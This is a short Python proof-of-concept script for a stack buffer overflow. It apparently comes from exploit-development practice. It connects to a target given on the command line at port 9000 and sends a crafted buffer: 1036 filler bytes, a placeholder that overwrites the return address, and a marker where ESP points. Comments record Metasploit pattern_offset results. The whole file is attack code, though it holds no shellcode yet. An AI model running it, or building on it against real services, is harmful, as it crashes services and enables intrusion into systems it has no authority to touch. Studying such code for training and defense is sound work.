#!/usr/bin/python

import socket,sys

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect((sys.argv[1], 9000))

buffer = "A" * 1036

buffer += "BBBB" # Overwrite RET address on the stack

buffer += "CCCC" # ESP is pointing 

buffer += "D" * 300

# EIP address
# /usr/share/metasploit-framework/tools/exploit# ./pattern_offset.rb -q <Address at EIP>
# [*] Exact match at offset 1036

# Top of the stack address
# /usr/share/metasploit-framework/tools/exploit# ./pattern_offset.rb -q <Address at the top of the stack>
# [*] Exact match at offset 1040

sock.send(buffer)

sock.close()
